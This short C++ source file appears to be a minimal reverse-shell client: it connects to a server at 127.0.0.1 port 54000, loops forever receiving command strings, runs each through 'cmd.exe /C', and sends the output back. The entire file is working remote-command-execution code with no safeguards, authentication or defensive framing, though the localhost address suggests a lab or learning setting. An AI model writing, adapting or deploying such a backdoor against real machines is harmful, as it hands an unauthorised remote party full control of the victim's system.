#include <iostream>
#include <string>
#include "TCPClient.h"
#include "utils.h"

int main()
{
	TCPClient* conn = new TCPClient("127.0.0.1", 54000);
	conn->start_connection();
	while (true)
	{
		// recv command from server
		std::string commandLine = "cmd.exe /C ";
		commandLine.append(conn->recv_data());
		std::string result = exec(commandLine);
		//std::cout << result;

		conn->send_data(result);
	}
	return 0;
}
